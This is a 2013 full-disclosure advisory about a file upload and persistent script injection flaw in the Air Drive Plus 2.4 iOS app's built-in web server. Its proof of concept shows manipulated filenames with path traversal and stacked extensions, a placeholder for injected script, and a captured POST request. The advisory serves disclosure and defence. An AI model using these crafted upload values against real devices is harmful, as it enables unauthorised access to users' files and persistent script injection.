
Date: Wed, 10 Jul 2013 21:12:14 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: full-disclosure@...ts.grok.org.uk
Subject: Air Drive Plus v2.4 iOS - Arbitrary File Upload
	Vulnerability

Title:
======
Air Drive Plus v2.4 iOS - Arbitrary File Upload Vulnerability


Date:
=====
2013-07-09


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=1000


VL-ID:
=====
1000


Common Vulnerability Scoring System:
====================================
6.7


Introduction:
=============
Turn your iPhone, iPod touch, and iPad into a wireless disk. Share your files and photos over network, no USB cable or 
extra software required. Features ...

[Server] function
Easily access your files from any web browser.
Easily upload and download your photo from photo libraries via web browser.

[My Files] function
Preview/Move/Copy/Delete/Unzip/Rename/Email file and Create new directory on your iPhone, iPod touch & iPad.

Image: png, jpg, gif
Document: Word, PowerPoint, Excel, PDF
Compressed: zip
Text-base: txt, html, php, js, css
Media: mp3, wav, mp4, mov

Save Word, PowerPoint, Excel and PDF files from other apps to Air Drive, include Apple’s Email app and Safari.
Open All types of file from Air Drive to other apps such as Dropbox.

[Settings] function
Add Password to prevent unauthorized access to your files.
Customize the Server port and Real-time On/Off the sharing functions and takes effect immediately to restrict the access from web browser

(Copy of the Homepage: https://itunes.apple.com/de/app/air-drive-plus-your-file-manager/id422806570 )


Abstract:
=========
The Vulnerability Laboratory Research Team discovered a remote file include vulnerability in the Air Drive Plus 2.4 application (Apple iOS - iPad&iPhone).


Report-Timeline:
================
2013-07-09:    Public Disclosure (Vulnerability Laboratory)


Status:
========
Published


Affected Products:
==================
Apple AppStore
Product: Air Drive Plus 2.4


Exploitation-Technique:
=======================
Remote


Severity:
=========
High


Details:
========
A local file include and arbitrary file upload web vulnerability is detected in the Air Drive Plus 2.4 application (Apple iOS - iPad&iPhone).
The vulnerability allows remote attackers to upload files via POST method with multiple extensions to unauthorized access them on 
application-side of the service.

The vulnerability is located in the file upload/add (AirDriveAction_file_add) module of the web-server (http://localhost:8000/) when processing 
to request a manipulated filename via POST. The injected file will be accessable via the index listing module of the application.  

Remote attackers can exchange the filename with a double or tripple extension bia POST method to bypass the upload validation and filter process. 
After the upload the attacker access the file with one extension and exchange it with the other one to execute for example php codes.

A persistent script code injection is detected in the filename parameter. Attackers can tamper the request and exchange the file name with 
persistent malicious script code or tags. The code will be executed in the main index site when processing to list the object (file) items.
Attackers are also able to inject persistent code with local frame requests to unauthorized access application data/apps or restricted 
application information. The execution of the persistent code also occurs when an application user is processing to delete the malicious context. 
The injected code is stored and will be executed from the delete notification and protection message.

Exploitation of the vulnerability requires no user interaction and also without privilege application user account (no password standard).
Successful exploitation of the vulnerability results in unauthorized path or file access via local file include or arbitrary file upload.

Vulnerable Application(s):
				[+] Air Drive Plus 2.4 - ITunes or AppStore (Apple)

Vulnerable Module(s):
				[+] File Upload  (Web Server) [Remote]

Vulnerable File(s):
				[+] AirDriveAction_file_add

Vulnerable Parameter(s):
				[+] filename

Affected Module(s):
				[+] Application Index Listing (http://localhost:8000/)


Proof of Concept:
=================
The arbitrary file upload vulnerability can be exploited by remote attackers without privileged application user account and 
also without user interaction. For demonstration or reproduce ...

1.1
<tr><td><img src="Air%20Drive%20-%20Files_files/file.png" height="20px" width="20px"></td><td><a target="_blank" href="http://192.168.2.104:8000/AirDriveAction_file_show/;/private/var/mobile/Applications">;/private/var/mobile/Applications/</a></td>
<td>27,27KB</td><td align="center">2013-07-08 23:07:52</td><td align="center">
<a onclick="javascript:delfile("/private/var/mobile/Applications");" class="transparent_button">Delete</a></td></tr>

1.2
<tr><td><img src="Air%20Drive%20-%20Files_files/file.png" height="20px" width="20px"></td><td><a target="_blank" href="http://192.168.2.104:8000/AirDriveAction_file_show/1337.png.gif.php.js.html">1337.png.gif.php.js.html</a></td>
<td>27,27KB</td><td align="center">2013-07-08 23:07:52</td><td align="center"><a onclick="javascript:delfile("1337.png.gif.php.js.html");" 
class="transparent_button">Delete</a></td></tr>

1.3
<tr><td><img src="Air%20Drive%20-%20Files_files/file.png" height="20px" width="20px"></td><td><a target="_blank" href="http://192.168.2.104:8000/AirDriveAction_file_show/[PERSISTENT INJECTED SCRIPT CODE!]1337.png">[PERSISTENT INJECTED SCRIPT CODE!]1337.png</a></td><td>27,27KB</td><td align="center">
2013-07-08 23:07:52</td><td align="center"><a onclick="javascript:delfile("[PERSISTENT INJECTED SCRIPT CODE!]1337.png");" class="transparent_button">Delete</a></td></tr>


--- Session Request Log ---
Status: 302[Found]

POST http://localhost:8000/AirDriveAction_file_add 
Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] 
Content Size[83] 
Mime Type[text/html]

   
Request Headers:
      
Host[localhost:8000]
      
User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0]
      
Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      
Accept-Language[en-US,en;q=0.5]
      Accept-Encoding[gzip, deflate]
      
DNT[1]
      Referer[http://localhost:8000/index_files.html]
      
Connection[keep-alive]
   Post Data:
      
POST_DATA[-----------------------------228191371227676
Content-Disposition: form-data; name="uploadfile"; filename=";/private/var/mobile/Applications/1337.png"


Reference(s):
http://localhost:8000/AirDriveAction_file_add 


Risk:
=====
The security risk of the arbitrary file upload vulnerability and the multiple extensions issue are estimated as high(+).


Credits:
========
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@...lution-sec.com)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases 
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register
Contact:    admin@...nerability-lab.com 	- support@...nerability-lab.com 	       - research@...nerability-lab.com
Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and 
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
modify, use or edit our material contact (admin@...nerability-lab.com or support@...nerability-lab.com) to get a permission.

    				   	Copyright © 2013 | Vulnerability Laboratory



-- 
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/